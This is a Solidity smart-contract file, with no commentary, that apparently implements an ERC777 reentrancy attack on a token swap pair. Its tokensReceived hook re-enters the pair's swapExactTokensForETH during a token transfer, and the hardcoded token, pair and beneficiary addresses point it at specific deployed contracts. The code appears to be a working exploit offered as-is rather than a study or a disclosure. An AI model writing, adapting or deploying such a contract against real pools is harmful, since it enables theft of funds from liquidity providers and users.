pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC777/IERC777.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/introspection/IERC1820Registry.sol";
import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";

interface IPair {
    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address to,
        uint256 deadline
    ) external returns(uint256);
    function swapETHForExactTokens(
        uint256 amountOut,
        address to,
        uint256 deadline
    ) external payable returns(uint256);
}

contract Simple777Recipient is IERC777Recipient {

    IERC1820Registry private _erc1820 = IERC1820Registry(0xFd27017106933d86Bb35b9d4a26403335750DBBD);
    bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");

    IERC777 public _token = IERC777(0x65d8A7f9503fAC808FCad94C7E28A3a75e14e080);
    IERC20 public _token20 = IERC20(0x65d8A7f9503fAC808FCad94C7E28A3a75e14e080);
    IPair public pair = IPair(0x39aEBA2FC6983cF4cCD0775dE02EeDda43c75243);

    address public immutable me = payable(0xA28E810e3B9Dc6452f190E6953A9f3823fa56090);

    constructor () public {
        _token20.approve(address(pair), 18000000000000000000);
    }

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external override {
        require(msg.sender == address(_token), "Simple777Recipient: Invalid token");
        pair.swapExactTokensForETH(amount, 1, address(this), block.timestamp*2);
    }

    function invoke(uint256 _amount) public payable {
        pair.swapETHForExactTokens{value: msg.value}(_amount, address(this), block.timestamp*2);
    }

    receive() external payable {}
}